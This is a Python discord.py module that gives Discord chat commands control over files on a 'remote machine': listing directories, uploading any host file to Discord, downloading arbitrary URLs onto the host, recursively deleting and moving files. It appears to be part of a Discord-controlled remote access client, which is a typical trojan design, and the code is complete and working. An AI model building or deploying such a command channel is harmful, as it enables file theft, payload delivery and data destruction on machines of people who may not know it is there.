import os
import shutil
import requests
import discord
from discord.ext import commands
from src.client.core.platform import Platform

class FileManager(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="ls", help="List files in the current directory.")
    async def list_files(self, ctx, path="."):
        try:
            files = os.listdir(path)
            if not files:
                await ctx.send("📁 Directory is empty.")
                return
            
            output = f"📁 **Directory listing for `{os.path.abspath(path)}`**\n"
            for f in files:
                prefix = "📁" if os.path.isdir(os.path.join(path, f)) else "📄"
                output += f"{prefix} {f}\n"
            
            if len(output) > 1900:
                file_path = "ls_output.txt"
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(output)
                await ctx.send("📄 Listing too long, sending as file:", file=discord.File(file_path))
                os.remove(file_path)
            else:
                await ctx.send(output)
        except Exception as e:
            await ctx.send(f"❌ Error listing files: {str(e)}")

    @commands.command(name="upload", help="Upload a file from the remote machine to Discord.")
    async def upload(self, ctx, file_path):
        if not os.path.exists(file_path):
            await ctx.send(f"❌ File not found: `{file_path}`")
            return
        
        try:
            # Discord has a file size limit (8MB/25MB/50MB depending on server/boost)
            # We'll try to send it and catch if it's too big
            await ctx.send(f"📤 Uploading `{os.path.basename(file_path)}`...")
            await ctx.send(file=discord.File(file_path))
        except Exception as e:
            await ctx.send(f"❌ Upload Error: {str(e)}")

    @commands.command(name="download", help="Download a file from a URL to the remote machine.")
    async def download(self, ctx, url, filename):
        try:
            await ctx.send(f"📥 Downloading `{filename}` from URL...")
            response = requests.get(url, stream=True)
            with open(filename, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            await ctx.send(f"✅ Download complete: `{os.path.abspath(filename)}`")
        except Exception as e:
            await ctx.send(f"❌ Download Error: {str(e)}")

    @commands.command(name="rm", help="Remove a file or directory.")
    async def remove(self, ctx, path):
        try:
            if os.path.isfile(path):
                os.remove(path)
                await ctx.send(f"✅ Deleted file: `{path}`")
            elif os.path.isdir(path):
                shutil.rmtree(path)
                await ctx.send(f"✅ Deleted directory: `{path}`")
            else:
                await ctx.send(f"❌ Path not found: `{path}`")
        except Exception as e:
            await ctx.send(f"❌ Delete Error: {str(e)}")

    @commands.command(name="mv", help="Move or rename a file/directory.")
    async def move(self, ctx, src, dst):
        try:
            shutil.move(src, dst)
            await ctx.send(f"✅ Moved `{src}` to `{dst}`")
        except Exception as e:
            await ctx.send(f"❌ Move Error: {str(e)}")

async def setup(bot):
    await bot.add_cog(FileManager(bot))
